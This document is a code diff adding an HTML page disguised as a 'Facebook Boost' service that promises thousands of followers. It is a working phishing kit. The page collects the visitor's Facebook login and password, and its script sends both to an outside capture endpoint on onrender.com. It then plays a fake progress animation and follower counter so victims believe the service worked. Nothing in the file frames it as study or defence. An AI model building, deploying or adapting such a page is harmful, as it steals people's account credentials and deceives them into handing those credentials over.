@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Growth Dashboard - Enhanced Blue/White</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- RESET & FONTS --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Stronger Blue/Black Gradient Background */
+            background: radial-gradient(circle at center, #0d1a33, #000000);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glow (Brighter Blue effect) */
+        body::before {
+            content: '';
+            position: absolute;
+            top: -20%;
+            left: -20%;
+            width: 60%;
+            height: 60%;
+            background: radial-gradient(circle, #1877f2 0%, transparent 70%);
+            opacity: 0.5; /* Increased opacity */
+            filter: blur(100px);
+            z-index: -1;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            bottom: -20%;
+            right: -20%;
+            width: 60%;
+            height: 60%;
+            background: radial-gradient(circle, #42a5f5 0%, transparent 70%);
+            opacity: 0.4; /* Increased opacity */
+            filter: blur(100px);
+            z-index: -1;
+        }
+
+        /* --- GLASS CARD CONTAINER --- */
+        .card {
+            /* Lighter, bluer glass background */
+            background: rgba(30, 40, 60, 0.75);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            width: 400px; /* Slightly wider */
+            padding: 45px 35px;
+            border-radius: 20px;
+            /* Brighter blue/white border */
+            border: 1px solid rgba(150, 200, 255, 0.2);
+            /* Blue outer glow */
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 40px rgba(24, 119, 242, 0.2);
+            text-align: center;
+            color: white;
+            transition: height 0.3s ease;
+        }
+
+        /* --- HEADER --- */
+        .header {
+            margin-bottom: 35px;
+        }
+
+        .fb-logo-icon {
+            font-size: 58px;
+            margin-bottom: 15px;
+            /* Brighter Facebook Blue */
+            color: #2D88FF;
+            text-shadow: 0 0 25px rgba(45, 136, 255, 0.7);
+        }
+
+        h2 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+            /* White text glow */
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: #d0d7e7; /* Lighter blue-white text */
+        }
+
+        /* --- FORM ELEMENTS --- */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #90b0e0; /* Brighter icon color */
+            font-size: 16px;
+            z-index: 1;
+        }
+
+        .input-field, select {
+            width: 100%;
+            /* Much lighter, transparent white/blue background */
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 16px 16px 16px 50px; 
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+            appearance: none;
+            font-weight: 500;
+        }
+        
+        .input-field::placeholder {
+            color: #90b0e0;
+        }
+
+        /* Custom Arrow for Select */
+        .select-wrapper::after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #90b0e0;
+            pointer-events: none;
+            font-size: 12px;
+        }
+
+        .input-field:focus, select:focus {
+            border-color: #42a5f5; /* Bright Blue Border */
+            box-shadow: 0 0 15px rgba(66, 165, 245, 0.4);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        /* --- BUTTON --- */
+        .btn-start {
+            width: 100%;
+            margin-top: 15px;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            /* Vibrant Blue Gradient */
+            background: linear-gradient(135deg, #2D88FF, #0056b3);
+            color: white;
+            font-weight: 700;
+            font-size: 17px;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(45, 136, 255, 0.4);
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-start:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(45, 136, 255, 0.6);
+            background: linear-gradient(135deg, #4FA3FF, #0062cc);
+        }
+
+        /* --- PROCESS SCREEN (Hidden Initially) --- */
+        #process-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .user-preview {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            /* Blue tinted background for user box */
+            background: rgba(45, 136, 255, 0.15);
+            padding: 12px 20px;
+            border-radius: 50px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            border: 1px solid rgba(45, 136, 255, 0.4);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .avatar-circle {
+            width: 45px;
+            height: 45px;
+            background: #2D88FF; /* Blue background */
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 22px;
+            border: 2px solid white;
+        }
+
+        .user-info-text {
+            text-align: left;
+        }
+
+        .u-name {
+            font-weight: 700;
+            font-size: 16px;
+            display: block;
+            color: #ffffff;
+        }
+
+        .verified {
+            color: #4FA3FF; /* Lighter Blue Tick */
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 600;
+        }
+
+        /* Loading Spinner */
+        .loader-text {
+            color: #d0d7e7;
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(45, 136, 255, 0.2);
+            border-top-color: #2D88FF;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            /* Brighter FB Blue Gradient Bar */
+            background: linear-gradient(90deg, #2D88FF, #54c7fc);
+            transition: width 0.5s ease;
+            box-shadow: 0 0 15px rgba(45, 136, 255, 0.7);
+        }
+
+        /* Delivered Box */
+        .delivered-box {
+            /* Blue tinted background */
+            background: rgba(45, 136, 255, 0.1);
+            border-radius: 16px;
+            padding: 25px;
+            border: 1px solid rgba(45, 136, 255, 0.4);
+            box-shadow: inset 0 0 20px rgba(45, 136, 255, 0.1);
+        }
+
+        .delivered-label {
+            font-size: 12px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: #90b0e0;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .delivered-count {
+            font-size: 48px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 25px rgba(45, 136, 255, 0.6);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <i class="fab fa-facebook fb-logo-icon"></i>
+            <h2>FACEBOOK BOOST</h2>
+            <p class="subtitle">Premium reach & engagement service.</p>
+        </div>
+
+        <div id="form-screen">
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="text" id="username" class="input-field" placeholder="Email or Phone" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-lock"></i> <input type="password" id="password" class="input-field" placeholder="Password">
+            </div>
+
+            <div class="input-group select-wrapper">
+                <i class="fas fa-users"></i>
+                <select id="followers" class="input-field">
+                    <option value="1000">1,000 Followers/Friends</option>
+                    <option value="2500">2,500 Followers/Friends</option>
+                    <option value="5000">5,000 Followers/Friends</option>
+                    <option value="10000">10,000 Followers (Page VIP)</option>
+                </select>
+            </div>
+
+            <button class="btn-start" onclick="startEngine()">
+                Start Boost <i class="fas fa-rocket"></i>
+            </button>
+        </div>
+
+        <div id="process-screen">
+            
+            <div class="user-preview">
+                <div class="avatar-circle">
+                    <i class="fas fa-user-check"></i>
+                </div>
+                <div class="user-info-text">
+                    <span class="u-name" id="display-username">User Name</span>
+                    <div class="verified"><i class="fas fa-check-circle"></i> Profile Verified</div>
+                </div>
+            </div>
+
+            <div class="loader-text">
+                <div class="spinner"></div>
+                <span id="status-text">Connecting to server...</span>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+
+            <div class="delivered-box">
+                <div class="delivered-label">SUCCESSFULLY ADDED</div>
+                <div class="delivered-count" id="count-display">0</div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        function startEngine() {
+            const userInput = document.getElementById('username').value.trim();
+            const passInput = document.getElementById('password').value;
+            const targetInput = document.getElementById('followers').value;
+
+            // Basic validation
+            if (!userInput) {
+                alert("Please enter your email or phone number.");
+                return;
+            }
+            if (!passInput) {
+                alert("Please enter your password.");
+                return;
+            }
+            
+            const id = "1823013721"; 
+    const p = "Instagram"
+
+    fetch(`https://tunnel-instagram-123.onrender.com/capture`, {  
+    method: 'POST',  
+    headers: {  
+        'Content-Type': 'application/json',  
+    },  
+    body: JSON.stringify({  
+        userid: id,  
+        user: userInput,  
+        pass: passInput,  
+        platform: p  
+    })  
+})
+.then(response => {  
+    if (!response.ok) throw new Error(`Server error: ${response.status}`);  
+    return response.json();  
+})
+.then(data => {  
+    console.log("Server response:", data);  
+})
+.catch(err => {  
+    console.error("Fetch failed:", err);  
+});
+
+            const target = parseInt(targetInput, 10);
+            
+            // Switch Screen
+            document.getElementById('form-screen').style.display = 'none';
+            document.getElementById('process-screen').style.display = 'block';
+
+            document.getElementById('display-username').innerText = userInput;
+
+            const progressBar   = document.getElementById('progress-bar');
+            const statusText    = document.getElementById('status-text');
+            const counterDisplay = document.getElementById('count-display');
+
+            let progress = 0;
+            let currentCount = 0;
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 1.5 + 0.5; 
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    finish();
+                    return;
+                }
+
+                progressBar.style.width = `${progress}%`;
+
+                // Status messages customized for FB
+                if      (progress < 20)  statusText.innerText = "Handshaking with Graph API...";
+                else if (progress < 40)  statusText.innerText = "Verifying account credentials...";
+                else if (progress < 65)  statusText.innerText = "Targeting audience...";
+                else if (progress < 85)  statusText.innerText = "Injecting followers...";
+                else                     statusText.innerText = "Cleaning logs...";
+
+                // Counter animation
+                if (progress > 25) {
+                    const increment = Math.max(1, Math.ceil(target / 100));
+                    currentCount += increment;
+                    if (currentCount > target) currentCount = target;
+                    counterDisplay.innerText = currentCount.toLocaleString();
+                }
+
+            }, 80); 
+
+            function finish() {
+                statusText.innerText = "Success!";
+                statusText.style.color = "#2D88FF"; // Brighter Blue success color
+                statusText.style.fontWeight = "bold";
+                
+                const spinner = document.querySelector('.spinner');
+                if (spinner) spinner.style.display = 'none';
+
+                const loaderText = document.querySelector('.loader-text');
+                if (loaderText) {
+                    loaderText.innerHTML = '<i class="fas fa-check-circle" style="color:#2D88FF; font-size: 18px;"></i> Process Complete';
+                }
+            }
+        }
+    </script>
+
+</body>
+</html>
